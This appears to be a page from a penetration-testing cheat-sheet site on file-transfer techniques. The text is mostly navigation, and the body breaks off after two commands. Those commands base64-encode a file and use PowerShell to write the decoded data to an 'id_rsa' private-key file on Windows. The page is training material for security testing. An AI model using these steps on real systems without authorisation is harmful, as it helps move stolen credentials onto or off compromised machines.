
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
      
      
      
        <link rel="prev" href="../../webinfogathering/">
      
      
        <link rel="next" href="../../shells/shells/">
      
      
      <link rel="icon" href="../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.5.37">
    
    
      
        <title>Files Transfer - Hacking Awesome CheatSheet</title>
      
    
    
      <link rel="stylesheet" href="../../assets/stylesheets/main.8c3ca2c6.min.css">
      
        
        <link rel="stylesheet" href="../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
      
    
    
      <link rel="stylesheet" href="../../css/custom.css">
    
    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      

    
    
    
  </head>
  
  
    
    
    
    
    
    <body dir="ltr" data-md-color-scheme="slate" data-md-color-primary="blue-grey" data-md-color-accent="green">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#windows-file-transfer-methods" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../.." title="Hacking Awesome CheatSheet" class="md-header__button md-logo" aria-label="Hacking Awesome CheatSheet" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            Hacking Awesome CheatSheet
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Files Transfer
            
          </span>
        </div>
      </div>
    </div>
    
      
    
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
        </button>
      </nav>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
  </nav>
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
          
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    



<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../.." title="Hacking Awesome CheatSheet" class="md-nav__button md-logo" aria-label="Hacking Awesome CheatSheet" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>

    </a>
    Hacking Awesome CheatSheet
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Home
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
        
          
          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Active Directory
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_2">
            <span class="md-nav__icon md-icon"></span>
            Active Directory
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/initial/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Initial
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/adenumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    AD Enumeration
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/credentials/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Credentials Haunting
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/lotl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Living Off the Land
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/acl/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ACL Abuse Primer
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/vulns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Common Vulnerabilities
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/trust/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Attacking Domain Trust
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/ldap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LDAP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/lateralmovement/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Lateral Movement
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/privilege/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Privilege Escalation
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/bloodhound/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    BloodHound
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../active-directory/crtp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CRTP
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
        
          
          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Enumeration
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_3">
            <span class="md-nav__icon md-icon"></span>
            Enumeration
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../enumeration/nmap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Nmap
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../enumeration/enumeration/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Enumeration
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
        
          
          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Footprinting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_4">
            <span class="md-nav__icon md-icon"></span>
            Footprinting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/domain-info/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Domain info
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/ftp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    FTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/ssh/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SSH
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/smtp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMTP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/dns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    DNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/imap-pop3/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IMAP/POP3
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/snmp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SNMP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/ldap/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    LDAP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/smb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    SMB
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/mssql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MSSQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/mysql/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MYSQL
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/nfs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    NFS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/rdp/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RDP
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/tns/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    ORACLE TNS
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/ipmi/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    IPMI
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/rsync/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RSYNC
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/rservices/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    RSERVICES
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/winrm/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    WinRM
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../footprinting/mongodb/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    MongoDB
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../webinfogathering/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Web Information Gathering
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
    
  
  
  
    <li class="md-nav__item md-nav__item--active">
      
      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
      
      
      
        <label class="md-nav__link md-nav__link--active" for="__toc">
          
  
  <span class="md-ellipsis">
    Files Transfer
  </span>
  

          <span class="md-nav__icon md-icon"></span>
        </label>
      
      <a href="./" class="md-nav__link md-nav__link--active">
        
  
  <span class="md-ellipsis">
    Files Transfer
  </span>
  

      </a>
      
        

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#windows-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell-based-decode-encode" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell based decode/ encode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      FTP Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-web-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      *PowerShell Web Uploads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Uploads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      FTP Uploads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Linux File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-downloads-with-wget-and-curl" class="md-nav__link">
    <span class="md-ellipsis">
      Web Downloads with Wget and cURL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fileless-attacks-using-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Fileless Attacks Using Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-with-bash-devtcp" class="md-nav__link">
    <span class="md-ellipsis">
      Download with Bash (/dev/tcp)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      SSH Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-upload-operations" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Upload Operations
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#alternative-web-file-transfer-method" class="md-nav__link">
    <span class="md-ellipsis">
      Alternative Web File Transfer Method
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Alternative Web File Transfer Method">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#scp-upload" class="md-nav__link">
    <span class="md-ellipsis">
      SCP Upload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#transferring-files-with-code" class="md-nav__link">
    <span class="md-ellipsis">
      Transferring Files with Code
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#miscellaneous-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Miscellaneous File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Miscellaneous File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#netcat" class="md-nav__link">
    <span class="md-ellipsis">
      NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-session-file-transfer" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell Session File Transfer
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rdp" class="md-nav__link">
    <span class="md-ellipsis">
      RDP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#protected-file-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      Protected File Transfers
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Protected File Transfers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#file-encryption-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      File Encryption on Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-encryption-on-linux" class="md-nav__link">
    <span class="md-ellipsis">
      File Encryption on Linux
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#catching-files-over-https" class="md-nav__link">
    <span class="md-ellipsis">
      Catching Files over HTTP/S
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#living-off-the-land" class="md-nav__link">
    <span class="md-ellipsis">
      Living off The Land
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#evading-detection" class="md-nav__link">
    <span class="md-ellipsis">
      Evading Detection
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../shells/shells/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Shells & Payloads
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../metasploit/metasploit/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Metasploit
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../pivoting/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Pivoting
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_10" >
        
          
          <label class="md-nav__link" for="__nav_10" id="__nav_10_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Walkthrough
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_10_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_10">
            <span class="md-nav__icon md-icon"></span>
            Walkthrough
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../htb-academy/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB Academy
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../htb-labs/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    HTB Labs
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
      
      
  
  
  
  
    <li class="md-nav__item">
      <a href="../../bash/bash_scripts/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Bash
  </span>
  

      </a>
    </li>
  

    
      
      
  
  
  
  
    
    
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_12" >
        
          
          <label class="md-nav__link" for="__nav_12" id="__nav_12_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Blue
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_12_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_12">
            <span class="md-nav__icon md-icon"></span>
            Blue
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../blue/phising.md" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Phishing
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              
              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    

<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
  
  
  
  
    <label class="md-nav__title" for="__toc">
      <span class="md-nav__icon md-icon"></span>
      Table of contents
    </label>
    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#windows-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Windows File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Windows File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#powershell-based-decode-encode" class="md-nav__link">
    <span class="md-ellipsis">
      Powershell based decode/ encode
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      FTP Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-web-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      *PowerShell Web Uploads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#smb-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      SMB Uploads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ftp-uploads" class="md-nav__link">
    <span class="md-ellipsis">
      FTP Uploads
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#linux-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Linux File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Linux File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#web-downloads-with-wget-and-curl" class="md-nav__link">
    <span class="md-ellipsis">
      Web Downloads with Wget and cURL
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#fileless-attacks-using-linux" class="md-nav__link">
    <span class="md-ellipsis">
      Fileless Attacks Using Linux
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#download-with-bash-devtcp" class="md-nav__link">
    <span class="md-ellipsis">
      Download with Bash (/dev/tcp)
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#ssh-downloads" class="md-nav__link">
    <span class="md-ellipsis">
      SSH Downloads
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#linux-upload-operations" class="md-nav__link">
    <span class="md-ellipsis">
      Linux Upload Operations
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#alternative-web-file-transfer-method" class="md-nav__link">
    <span class="md-ellipsis">
      Alternative Web File Transfer Method
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Alternative Web File Transfer Method">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#scp-upload" class="md-nav__link">
    <span class="md-ellipsis">
      SCP Upload
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#transferring-files-with-code" class="md-nav__link">
    <span class="md-ellipsis">
      Transferring Files with Code
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#miscellaneous-file-transfer-methods" class="md-nav__link">
    <span class="md-ellipsis">
      Miscellaneous File Transfer Methods
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Miscellaneous File Transfer Methods">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#netcat" class="md-nav__link">
    <span class="md-ellipsis">
      NetCat
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#powershell-session-file-transfer" class="md-nav__link">
    <span class="md-ellipsis">
      PowerShell Session File Transfer
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#rdp" class="md-nav__link">
    <span class="md-ellipsis">
      RDP
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#protected-file-transfers" class="md-nav__link">
    <span class="md-ellipsis">
      Protected File Transfers
    </span>
  </a>
  
    <nav class="md-nav" aria-label="Protected File Transfers">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#file-encryption-on-windows" class="md-nav__link">
    <span class="md-ellipsis">
      File Encryption on Windows
    </span>
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#file-encryption-on-linux" class="md-nav__link">
    <span class="md-ellipsis">
      File Encryption on Linux
    </span>
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#catching-files-over-https" class="md-nav__link">
    <span class="md-ellipsis">
      Catching Files over HTTP/S
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#living-off-the-land" class="md-nav__link">
    <span class="md-ellipsis">
      Living off The Land
    </span>
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#evading-detection" class="md-nav__link">
    <span class="md-ellipsis">
      Evading Detection
    </span>
  </a>
  
</li>
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          
            <div class="md-content" data-md-component="content">
              <article class="md-content__inner md-typeset">
                
                  


  <h1>Files Transfer</h1>

<h2 id="windows-file-transfer-methods"><strong>Windows File Transfer Methods</strong></h2>
<h4 id="powershell-based-decode-encode"><strong>Powershell based decode/ encode</strong></h4>
<ol>
<li>Convert to/from base64:<ol>
<li>File to base64 on Linux: <code>cat file | base64 -w 0; echo</code></li>
<li>Base64 to file on Windows: <code>[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CR(...)o="))</code></li>
